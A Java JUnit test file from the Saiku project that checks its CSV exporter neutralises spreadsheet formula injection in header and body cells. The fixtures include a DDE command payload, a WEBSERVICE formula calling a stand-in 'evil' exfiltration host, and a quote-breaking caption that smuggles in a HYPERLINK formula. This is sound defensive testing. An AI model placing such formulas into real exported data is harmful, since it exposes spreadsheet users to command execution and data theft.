/*
 *   Copyright 2026 Spicule Ltd
 *   Apache License, Version 2.0.
 */
package org.saiku.service.util.export;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;

import java.lang.reflect.Proxy;
import java.nio.charset.StandardCharsets;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Types;
import java.util.ArrayList;
import java.util.List;
import org.junit.Test;
import org.saiku.olap.dto.resultset.AbstractBaseCell;
import org.saiku.olap.dto.resultset.CellDataSet;
import org.saiku.olap.dto.resultset.DataCell;

/**
 * CSV formula-injection (CWE-1236) <b>wiring</b> coverage — complements {@link CsvExporterTest},
 * which exercises {@link CsvExporter#neutralizeCsvFormula} directly. This drives the
 * {@link CsvExporter#getCsv(CellDataSet, String, String)} export path with a malicious cube cell
 * to prove the neutralisation is actually APPLIED at the header + body emission sites. The unit
 * test locks the helper; this locks the call-site — so a refactor that dropped the
 * {@code neutralizeCsvFormula(...)} wrapping at an emission point (the real regression risk) goes
 * RED, not only one that broke the helper itself.
 */
public class CsvExporterWiringTest {

    private static DataCell cell(String formattedValue) {
        DataCell c = new DataCell();
        c.setFormattedValue(formattedValue);
        return c;
    }

    /** One-cell header + one-cell body, exported via the package-private CellDataSet seam. */
    private static String export(String headerValue, String bodyValue) {
        CellDataSet cds = new CellDataSet();
        cds.setCellSetHeaders(new AbstractBaseCell[][] {{cell(headerValue)}});
        cds.setCellSetBody(new AbstractBaseCell[][] {{cell(bodyValue)}});
        return new String(CsvExporter.getCsv(cds, ",", "\""), StandardCharsets.UTF_8);
    }

    @Test
    public void exportNeutralisesAMaliciousHeader() {
        // Header emission site (getCsv(CellDataSet,…), the rowHeader loop).
        String csv = export("=cmd|'/C calc'!A0", "Beer");
        assertTrue("malicious header must be neutralised in the export: " + csv, csv.contains("'=cmd|'/C calc'!A0"));
    }

    @Test
    public void exportNeutralisesAMaliciousBodyValue() {
        // Body emission site (getCsv(CellDataSet,…), the rowData loop).
        String csv = export("Product", "=WEBSERVICE(\"http://evil/exfil\")");
        assertTrue("malicious body value must be neutralised in the export: " + csv, csv.contains("'=WEBSERVICE"));
    }

    @Test
    public void exportLeavesBenignTextAndNumbersUnquoted() {
        // Negative control: the wiring must not over-neutralise legitimate data.
        String text = export("Product", "Beer");
        assertFalse("benign text must not gain a formula-guard prefix: " + text, text.contains("'Beer"));
        String number = export("Margin", "-1,234.50");
        assertFalse("a negative number must not be quoted into text: " + number, number.contains("'-1,234.50"));
    }

    /** A calculated-member caption carrying {@code ","} must not close its own CSV field:
     *  the header cell's quotes are doubled, so the line stays ONE field and no field can
     *  begin with a formula character. saiku#2544 — previously the header escaped nothing,
     *  so {@code x","=HYPERLINK(...)} emitted a live fourth field. */
    @Test
    public void exportDoublesQuotesInAHeaderCaptionCarryingCommaQuote() {
        String caption = "x\",\"=HYPERLINK(\"http://127.0.0.1:1/x\",\"click\")";
        String csv = export(caption, "Beer");
        String[] lines = csv.split("\r\n", -1);
        // The whole header line must be one field: the caption with every quote doubled,
        // wrapped once — not four comma-separated fields with the fourth starting with '='.
        assertEquals(
                "header must be a single quoted field with doubled quotes: " + lines[0],
                "\"" + caption.replace("\"", "\"\"") + "\"",
                lines[0]);
        assertFalse("no field may start with a formula char: " + lines[0], lines[0].contains(",=\""));
    }

    /* ---- ResultSet path: the header loop there had the same gap (saiku#2544). ---- */

    /** Minimal {@link ResultSet} stub over one VARCHAR column, driven by dynamic proxies —
     *  no mocking framework involved. */
    private static ResultSet resultSetWith(String columnName, String... rowValues) throws Exception {
        List<Object[]> rows = new ArrayList<>();
        for (String v : rowValues) {
            rows.add(new Object[] {v});
        }
        ResultSetMetaData meta = (ResultSetMetaData) Proxy.newProxyInstance(
                ResultSet.class.getClassLoader(), new Class<?>[] {ResultSetMetaData.class}, (proxy, method, args) -> {
                    switch (method.getName()) {
                        case "getColumnCount":
                            return 1;
                        case "getColumnName":
                            return columnName;
                        case "getColumnType":
                            return Types.VARCHAR;
                        default:
                            return null;
                    }
                });
        final int[] cursor = {0};
        return (ResultSet) Proxy.newProxyInstance(
                ResultSet.class.getClassLoader(), new Class<?>[] {ResultSet.class}, (proxy, method, args) -> {
                    switch (method.getName()) {
                        case "next":
                            return cursor[0]++ < rows.size();
                        case "getMetaData":
                            return meta;
                        case "getString": {
                            String v = (String) rows.get(cursor[0] - 1)[(int) args[0] - 1];
                            return v;
                        }
                        case "wasNull":
                            return false;
                        default:
                            return null;
                    }
                });
    }

    @Test
    public void resultSetExportDoublesQuotesInHeaderCells() throws Exception {
        String caption = "x\",\"=HYPERLINK(\"http://127.0.0.1:1/x\",\"click\")";
        String csv = new String(CsvExporter.exportCsv(resultSetWith(caption, "F", "M")), StandardCharsets.UTF_8);
        String[] lines = csv.split("\r\n", -1);
        assertEquals(
                "ResultSet header must be a single quoted field with doubled quotes: " + lines[0],
                "\"" + caption.replace("\"", "\"\"") + "\"",
                lines[0]);
    }
}
